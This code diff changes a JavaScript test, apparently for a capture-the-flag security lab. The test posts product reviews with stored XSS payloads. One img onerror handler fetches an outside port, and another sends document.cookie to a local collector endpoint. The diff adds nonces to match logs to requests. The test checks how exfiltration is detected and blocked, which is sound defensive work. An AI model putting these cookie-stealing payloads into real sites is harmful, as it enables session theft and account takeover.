@@ -48,6 +48,8 @@ async function run() {
 
   // 2. Fetch to localhost:9999 is aborted, but collector is logged.
   let listenerHit = false;
+  const nonceExt = Math.random().toString(36).substring(2);
+  const nonceInt = Math.random().toString(36).substring(2);
   const dummyServer = http.createServer((req, res) => {
     listenerHit = true;
     res.writeHead(200);
@@ -71,7 +73,7 @@ async function run() {
     
     socketBot.on('http-log', (log) => {
       receivedLogs.push({ url: log.url, threats: log.threats });
-      if (log.threats && log.threats.some(t => t.tag === 'Exfiltration')) {
+      if (log.threats && log.threats.some(t => t.tag === 'Exfiltration') && log.url.includes(nonceInt)) {
         collectorHit = true;
       }
       
@@ -86,13 +88,13 @@ async function run() {
     socketBot.on('connect', async () => {
       // Review with external fetch
       await request('POST', '/api/products/1/reviews', {
-        content: "<img src=x onerror='fetch(\"http://localhost:9999/x\")'>",
+        content: `<img src=x onerror='fetch("http://localhost:9999/x?n=${nonceExt}")'>`,
         rating: 5
       }, userToken);
       
       // Review with internal fetch (positive control)
       await request('POST', '/api/products/1/reviews', {
-        content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=session=\"+document.cookie)'>",
+        content: `<img src=x onerror='fetch("http://localhost:3000/api/ctf/collector?c="+document.cookie+"&n=${nonceInt}")'>`,
         rating: 5
       }, userToken);
     });
